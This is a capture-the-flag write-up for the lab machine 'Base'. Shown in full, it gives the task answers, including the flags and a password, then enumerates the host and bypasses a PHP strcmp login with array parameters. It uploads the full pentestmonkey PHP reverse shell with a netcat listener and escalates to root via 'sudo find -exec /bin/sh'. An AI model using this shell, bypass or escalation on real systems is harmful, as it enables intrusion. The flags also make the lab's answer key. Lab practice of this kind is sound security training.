# Tasks
- Which two TCP ports are open on the remote host?
	- 22,80
- What is the relative path on the webserver for the login page?
	- /login/login.php
- How many files are present in the '/login' directory?
	- 3
- What is the file extension of a swap file?
	- .swp
- Which PHP function is being used in the backend code to compare the user submitted username and password to the valid username and password?
	- strcmp()
- In which directory are the uploaded files stored?
	- /_uploaded
- Which user exists on the remote host with a home directory?
	- john
- What is the password for the user present on the system?
	- thisisagoodpassword
- What is the full path to the command that the user john can run as user root on the remote host?
	- /usr/bin/find
- What action can the find command use to execute commands?
	- exec
- User flag
	- f54846c258f3b4612f78a819573d158e
- Root flag
	- 51709519ea18ab37dd6fc58096bea949


# Notes
- First, let's do a rustscan
```
rustscan --ulimit 5000 --addresses "10.129.95.184" --top -- -sC -sV
```
- From the results, we see that there are 2 TCP ports open:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)
|   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)
|_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome to Base
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Next, let's run a gobuster instance:
```
gobuster dir --url http://10.129.95.184 --wordlist directory-list-lowercase-2.3-medium.txt 
```
- From the results. we can see the existance of a login screen, which appears that /login/ redirects to that:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 301) [Size: 314] [--> http://10.129.95.184/login/]
/assets               (Status: 301) [Size: 315] [--> http://10.129.95.184/assets/]
/forms                (Status: 301) [Size: 314] [--> http://10.129.95.184/forms/]
Progress: 5384 / 207644 (2.59%)


```
- Sure enough, we can access the login page through the login.php file
- There is also a swp file named login.php.swp. Downloading this, we are able to run strings through it and see the login.php source code:
```
b0VIM 8.0
root
base
/var/www/html/login/login.php
3210
#"! 
                  <input type="text" name="username" class="form-control" style="max-width: 30%;" id="username" placeholder="Your Username" required>
                <div class="form-group">
              <div class="row" align="center">
            <form id="login-form" action="" method="POST" role="form" style="background-color:#f8fbfe">
          <div class="col-lg-12 mt-5 mt-lg-0">
        <div class="row mt-2">
        </div>
          <p>Use the form below to log into your account.</p>
          <h2>Login</h2>
        <div class="section-title mt-5" >
      <div class="container" data-aos="fade-up">
    <section id="login" class="contact section-bg" style="padding: 160px 0">
    <!-- ======= Login Section ======= -->
  </header><!-- End Header -->
    </div>
      </nav><!-- .navbar -->
        <i class="bi bi-list mobile-nav-toggle"></i>
        </ul>
          <li><a class="nav-link scrollto action" href="/login.php">Login</a></li>
          <li><a class="nav-link scrollto" href="/#contact">Contact</a></li>
          <li><a class="nav-link scrollto" href="/#pricing">Pricing</a></li>
          <li><a class="nav-link scrollto" href="/#team">Team</a></li>
          <li><a class="nav-link scrollto" href="/#services">Services</a></li>
          <li><a class="nav-link scrollto" href="/#about">About</a></li>
          <li><a class="nav-link scrollto" href="/#hero">Home</a></li>
        <ul>
      <nav id="navbar" class="navbar">
      <!-- <a href="index.html" class="logo"><img src="../assets/img/logo.png" alt="" class="img-fluid"></a>-->
      <!-- Uncomment below if you prefer to use an image logo -->
      <h1 class="logo"><a href="index.html">BASE</a></h1>
    <div class="container d-flex align-items-center justify-content-between">
  <header id="header" class="fixed-top">
  <!-- ======= Header ======= -->
<body>
</head>
  <link href="../assets/css/style.css" rel="stylesheet">
  <!-- Template Main CSS File -->
  <link href="../assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
  <link href="../assets/vendor/remixicon/remixicon.css" rel="stylesheet">
  <link href="../assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="../assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="../assets/vendor/aos/aos.css" rel="stylesheet">
  <!-- Vendor CSS Files -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
  <!-- Google Fonts -->
  <link href="../assets/img/apple-touch-icon.png" rel="apple-touch-icon">
  <link href="../assets/img/favicon.png" rel="icon">
  <!-- Favicons -->
  <meta content="" name="keywords">
  <meta content="" name="description">
  <title>Welcome to Base</title>
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  <meta charset="utf-8">
<head>
<html lang="en">
<!DOCTYPE html>
    }
        print("<script>alert('Wrong Username or Password')</script>");
    } else {
        }
            print("<script>alert('Wrong Username or Password')</script>");
        } else {
            header("Location: /upload.php");
            $_SESSION['user_id'] = 1;
        if (strcmp($password, $_POST['password']) == 0) {
    if (strcmp($username, $_POST['username']) == 0) {
    require('config.php');
if (!empty($_POST['username']) && !empty($_POST['password'])) {
session_start();
<?php
</html>
</body>
  <script src="../assets/js/main.js"></script>
```
- From the code, we can see that this is using strcmp.
- However, something with strcmp is that changing the variables into empty arrays instead of a string causes strcmp to return true
- We need to modify the variables in this case, so we'll need Burp Suite to capture the packet, allow us to change it up, and then resend it out
- Here is the packet in question:
```
POST /login/login.php HTTP/1.1
Host: 10.129.25.18
Content-Length: 32
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.129.25.18
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.25.18/login/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=do0i8h5rkkc5739cffc0bjcbrf
Connection: keep-alive

username=admin&password=password
```
- We can now modify the data to look something like this:
```
POST /login/login.php HTTP/1.1
Host: 10.129.25.18
Content-Length: 32
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.129.25.18
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.25.18/login/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=do0i8h5rkkc5739cffc0bjcbrf
Connection: keep-alive

username[]=admin&password[]=password
```
- Should be noted that this attack only works from a fresh/recent packet, so sending packets to the Repeater will not work. I was able to figure this out, but I will note this for anything future wise.
- From that, we are able to successfully login!
- We are then greeted to a file upload screen, so I say upload a reverse shell and connect back to our machine via netcat.
- I'll use the same PHP reverse shell we have been using for a while:
```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.15.113'; 
$port = 4444;      
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
- We can then run netcat to catch the connection when we run the file:
```
nc -lvnp 4444
```
- We were then able to get our connection!
```
Ncat: Version 7.93 ( https://nmap.org/ncat )  
Ncat: Listening on :::4444  
Ncat: Listening on 0.0.0.0:4444  
Ncat: Connection from 10.129.27.76.  
Ncat: Connection from 10.129.27.76:32814.  
Linux base 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux  
06:22:17 up 31 min,  0 users,  load average: 0.00, 0.00, 0.00  
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
/bin/sh: 0: can't access tty; job control turned off  
$
```
 - We can't seem to get the user flag yet, but we do know that a user named john exists on the system:
```
$ whoami  
www-data  
$ ls  
bin  
boot  
cdrom  
dev  
etc  
home  
initrd.img  
initrd.img.old  
lib  
lib64  
lost+found  
media  
mnt  
opt  
proc  
root  
run  
sbin  
srv  
sys  
tmp  
usr  
var  
vmlinuz  
vmlinuz.old  
$ cd home  
$ ls  
john  
$ cd john  
$ ls  
user.txt  
$ cat user.txt  
cat: user.txt: Permission denied  
$
```
- However, before we continue, I'm going to upgrade the shell so that its a bit nicer:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- Within the web server files, I was able to find a set of credentials within the config.php file:
```
www-data@base:/var/www/html/login$ cat config.php  
cat config.php  
<?php  
$username = "admin";  
$password = "thisisagoodpassword";www-data@base:/var/www/html/login$
```
- Password reuse is pretty common, so I went ahead and used it for john, and was able to login as him!
```
www-data@base:/var/www/html/login$ cat config.php  
cat config.php  
<?php  
$username = "admin";  
$password = "thisisagoodpassword";www-data@base:/var/www/html/login$ su john  
su john  
Password: thisisagoodpassword  
  
john@base:/var/www/html/login$
```
- Now, I am able to get the user flag out
```
john@base:/var/www/html/login$ cd /home/john  
cd /home/john  
john@base:~$ ls  
ls  
user.txt  
john@base:~$ cat user.txt  
cat user.txt  
f54846c258f3b4612f78a819573d158e
```
- With that done, we are ready to move onto getting into the root account
- We can use sudo -l and see that we have access to the find command:
```
john@base:~$ sudo -l    
sudo -l  
[sudo] password for john: thisisagoodpassword  
  
Matching Defaults entries for john on base:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User john may run the following commands on base:  
   (root : root) /usr/bin/find  
john@base:~$
```
- We can look into something like GTFOBins, and be able to find a oneliner that will work:
```
sudo find . -exec /bin/sh \; -quit
```
- Using that, it works and we were able to get root!
```
john@base:~$ sudo find . -exec /bin/sh \; -quit  
sudo find . -exec /bin/sh \; -quit  
# whoami  
whoami  
root  
#
```
- We can now navigate to the root folder and grab the root flag!
```
# cd /root  
cd /root  
# ls  
ls  
root.txt  
# cat root.txt  
cat root.txt  
51709519ea18ab37dd6fc58096bea949
```
